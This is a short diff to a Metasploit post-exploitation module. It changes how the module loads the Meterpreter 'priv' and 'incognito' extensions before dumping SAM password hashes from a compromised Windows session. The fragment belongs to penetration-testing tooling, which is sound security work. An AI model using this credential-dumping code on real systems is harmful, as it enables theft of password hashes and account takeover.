@@ -43,8 +43,8 @@ class Metasploit3 < Msf::Post
 		end
 
 		# Make sure we're rockin Priv and Incognito
-		session.core.use("priv") if not session.respond_to?("priv")
-		session.core.use("incognito") if not session.respond_to?("incognito")
+		session.core.use("priv") if not session.priv
+		session.core.use("incognito") if not session.incognito
 
 		# It wasn't me mom! Stinko did it!
 		hashes = client.priv.sam_hashes
